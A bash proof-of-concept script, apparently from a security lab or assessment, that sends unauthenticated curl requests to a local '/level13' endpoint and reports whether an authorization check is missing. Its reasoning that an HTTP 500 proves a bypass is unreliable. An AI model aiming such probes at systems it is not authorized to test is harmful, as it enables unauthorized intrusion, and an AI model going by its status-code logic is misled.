#!/bin/bash

# POC: Missing Authorization Checks on Protected Endpoint (/level13)
# This script demonstrates that the /level13 endpoint is directly accessible
# without any authentication, returning a 500 error instead of 401/403 Unauthorized

TARGET="http://localhost:5001"
ENDPOINT="/level13"

echo "=========================================="
echo "Missing Authorization POC - /level13"
echo "=========================================="
echo ""

# Test 1: Direct access without authentication
echo "[*] Test 1: Attempting direct access to protected endpoint without authentication"
echo "[*] Command: curl -s -w '%{http_code}' '$TARGET$ENDPOINT?name=test'"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET$ENDPOINT?name=test" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] Response Status Code: $HTTP_CODE"
echo "[*] Response Body Preview:"
echo "$BODY" | head -5
echo ""

# Analysis
echo "[*] VULNERABILITY ANALYSIS:"
if [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo "    ✓ PROTECTED: Endpoint correctly returns $HTTP_CODE (Unauthorized/Forbidden)"
    echo "    Status: Authorization check IS in place"
elif [ "$HTTP_CODE" = "500" ]; then
    echo "    ✗ VULNERABLE: Endpoint returns 500 (Internal Server Error)"
    echo "    This indicates the endpoint attempted to process the request"
    echo "    without checking authentication first."
    echo "    A 500 error means authorization checks were BYPASSED and the"
    echo "    endpoint tried to execute, failing due to missing dependencies."
    echo "    Status: Authorization check is MISSING"
    VULNERABLE=true
elif [ "$HTTP_CODE" = "200" ]; then
    echo "    ✗ VULNERABLE: Endpoint returns 200 (Success)"
    echo "    The endpoint is completely accessible without authentication"
    echo "    Status: Authorization check is MISSING"
    VULNERABLE=true
else
    echo "    ⚠ UNEXPECTED: Endpoint returns $HTTP_CODE"
fi

echo ""
echo "[*] Test 2: Checking for authentication/authorization headers"
HEADERS=$(curl -s -I "$TARGET$ENDPOINT?name=test" 2>&1)
echo "$HEADERS" | head -15
echo ""

if echo "$HEADERS" | grep -qi "401\|403\|authorization"; then
    echo "    ✓ Authorization headers detected"
else
    echo "    ✗ No authorization validation detected"
fi

echo ""
echo "=========================================="
if [ "$VULNERABLE" = "true" ]; then
    echo "RESULT: VULNERABLE"
    echo "/level13 is directly accessible without authentication"
    echo "Expected: HTTP 401/403 Unauthorized"
    echo "Actual: HTTP $HTTP_CODE"
else
    echo "RESULT: PROTECTED"
    echo "/level13 has proper authorization checks"
fi
echo "=========================================="

exit 0